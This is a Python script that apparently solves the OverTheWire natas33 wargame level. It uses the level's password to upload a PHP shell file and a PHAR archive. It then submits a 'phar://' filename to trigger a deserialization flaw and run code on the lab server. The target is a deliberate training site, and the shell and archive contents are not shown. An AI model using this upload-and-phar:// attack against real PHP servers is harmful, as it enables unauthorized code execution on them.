import requests
from requests.auth import HTTPBasicAuth

url = "http://natas33.natas.labs.overthewire.org/"
auth = HTTPBasicAuth("natas33", "kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL")

# Create a session object to maintain cookies and authentication
session = requests.Session()
session.auth = auth

# First upload: php_shell.php
files_shell = {
    "uploadedfile": ("php_shell.php", open("php_shell.php", "rb"))
}
data_shell = {
    "filename": "php_shell.php"
}

response1 = session.post(url, files=files_shell, data=data_shell)
print("--- Response from php_shell.php upload ---")
print(response1.text)


# Second upload: test.phar
files_phar = {
    "uploadedfile": ("test.phar", open("test.phar", "rb"))
}
data_phar = {
    "filename": "test.phar"
}

response2 = session.post(url, files=files_phar, data=data_phar)
print("\n--- Response from test.phar upload ---")
print(response2.text)

# Third upload/trigger: test.phar with phar:// wrapper
files_trigger = {
    "uploadedfile": ("test.phar", open("test.phar", "rb"))
}
data_trigger = {
    "filename": "phar://test.phar"  # triggers the vulnerability
}

response3 = session.post(url, files=files_trigger, data=data_trigger)
print("\n--- Response from trigger request ---")
print(response3.text)